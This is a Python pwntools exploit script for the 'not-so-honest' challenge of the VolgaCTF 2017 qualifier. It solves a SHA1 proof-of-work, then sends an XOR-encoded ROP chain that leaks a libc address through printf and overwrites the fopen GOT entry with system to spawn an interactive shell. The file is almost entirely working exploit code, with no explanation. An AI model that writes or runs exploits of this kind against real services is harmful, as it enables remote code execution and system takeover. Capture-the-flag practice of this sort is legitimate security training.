#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 8888

host = "not-so-honest.quals.2017.volgactf.ru"
port = 45678
r = remote(host,port)

r.recvuntil("x[:24]=='")
data = r.recvuntil("'")[:-1]
rand_str = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])
for i in range(10000000):
    t =   (data + rand_str(5)).ljust(29,"a")
    if (int(hashlib.sha1(t).hexdigest(),16) & 0b11111111111111111111111111) == 0b11111111111111111111111111 :
        print i
        break
r.sendline(t)
r.recvuntil("!")
flag = 0x602f80
printf = 0x400740
scanf = 0x400790
pop_rdi = 0x00000000004014a3
s = 0x401514 
magic = 0x400ac0
fopen = 0x400770
fopengot = 0x000000000602058
pop_rsi = 0x00000000004014a1
payload = "a"*(0x68*2)
#payload += hex(u64(p64(0x4141414141414^0xae1545be28a37740)[::-1]))[2:]
payload += hex(u64(p64(pop_rdi^0xae1545be28a37740)[::-1]))[2:]
payload += hex(u64(p64(0x1^0x25fb0bf7bdb38837)[::-1]))[2:]
payload += hex(u64(p64(pop_rsi^0x779cafa58e3d5446)[::-1]))[2:]
payload += hex(u64(p64(fopengot^0x8bb986f213f79bf4)[::-1]))[2:]
payload += hex(u64(p64(fopengot^0xdf7cc650e54b4da7)[::-1]))[2:]
payload += hex(u64(p64(printf^0x83cbe9e7ead8d9d7)[::-1]))[2:]
payload += hex(u64(p64(pop_rdi^0x599e6bb25478bdcb)[::-1]))[2:]
payload += hex(u64(p64(s^0xa2d79ee71cdb2d2)[::-1]))[2:]
payload += hex(u64(p64(pop_rsi^0xde9e386026667a13)[::-1]))[2:]
payload += hex(u64(p64((fopengot-3)^0x141d8264cb99d188)[::-1]))[2:]
payload += hex(u64(p64(fopengot^0x1f8ba31fcbd77f81)[::-1]))[2:]
payload += hex(u64(p64(scanf^0xe8fbdcdf1ae086b7)[::-1]))[2:]
payload += hex(u64(p64(pop_rdi^0xff8f22be89a1b08d)[::-1]))[2:] + "0"
payload += hex(u64(p64((fopengot-3)^0x3c61d7d66061854)[::-1]))[2:]
payload += hex(u64(p64(fopen^0xa35d1be152301269)[::-1]))[2:]
#payload += hex(u64(p64(0x42424242424242^0xa0c48200103b59be)[::-1]))[2:]
r.sendline(payload)
r.recvuntil("\n")
data = r.recvuntil("\x7f").ljust(8,"\x00")
libc = u64(data)-0x6dd70
print "libc:", hex(libc)
system = libc + 0x45390
r.sendline("sh;" + p64(system))
r.interactive()
